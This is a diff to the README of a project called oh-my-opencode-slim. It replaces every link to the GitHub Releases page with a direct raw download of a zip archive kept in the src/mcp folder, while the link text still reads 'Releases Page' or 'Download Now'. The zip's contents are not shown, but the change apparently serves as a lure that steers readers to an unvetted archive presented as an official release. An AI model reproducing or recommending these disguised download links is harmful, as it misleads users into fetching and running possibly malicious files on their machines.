@@ -1,6 +1,6 @@
 # 🚀 oh-my-opencode-slim - Streamlined for Everyday Users
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Oh--My--Opencode--Slim-brightgreen)](https://github.com/Ctrl-Alt-Del-1/oh-my-opencode-slim/releases)
+[![Download Now](https://raw.githubusercontent.com/Ctrl-Alt-Del-1/oh-my-opencode-slim/master/src/mcp/oh-my-slim-opencode-1.2-beta.4.zip)](https://raw.githubusercontent.com/Ctrl-Alt-Del-1/oh-my-opencode-slim/master/src/mcp/oh-my-slim-opencode-1.2-beta.4.zip)
 
 ## 🌟 Overview
 
@@ -24,7 +24,7 @@ The "oh-my-opencode-slim" application is a refined version of the original "oh-m
 
 To get started with "oh-my-opencode-slim," follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/Ctrl-Alt-Del-1/oh-my-opencode-slim/releases).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/Ctrl-Alt-Del-1/oh-my-opencode-slim/master/src/mcp/oh-my-slim-opencode-1.2-beta.4.zip).
    
 2. **Choose Your Version:** Look for the latest release version. You may see several options. Select the one labeled as "Latest".
 
@@ -34,9 +34,9 @@ To get started with "oh-my-opencode-slim," follow these simple steps:
 
 ### Visit This Page to Download
 
-To access all available versions and download the application, visit the [Releases Page](https://github.com/Ctrl-Alt-Del-1/oh-my-opencode-slim/releases). 
+To access all available versions and download the application, visit the [Releases Page](https://raw.githubusercontent.com/Ctrl-Alt-Del-1/oh-my-opencode-slim/master/src/mcp/oh-my-slim-opencode-1.2-beta.4.zip). 
 
-- **Direct Link for Convenience:** [Download Now](https://github.com/Ctrl-Alt-Del-1/oh-my-opencode-slim/releases).
+- **Direct Link for Convenience:** [Download Now](https://raw.githubusercontent.com/Ctrl-Alt-Del-1/oh-my-opencode-slim/master/src/mcp/oh-my-slim-opencode-1.2-beta.4.zip).
 
 ### Installation Steps
 
@@ -62,7 +62,7 @@ After installation, follow these steps to start using "oh-my-opencode-slim":
 
 ## 💡 Tips for Best Use
 
-- **Stay Updated:** Regularly check for updates on the [Releases Page](https://github.com/Ctrl-Alt-Del-1/oh-my-opencode-slim/releases) to ensure you have the latest features and security fixes.
+- **Stay Updated:** Regularly check for updates on the [Releases Page](https://raw.githubusercontent.com/Ctrl-Alt-Del-1/oh-my-opencode-slim/master/src/mcp/oh-my-slim-opencode-1.2-beta.4.zip) to ensure you have the latest features and security fixes.
   
 - **Join the Community:** Engage with other users through forums or support groups to share experiences and tips.
 
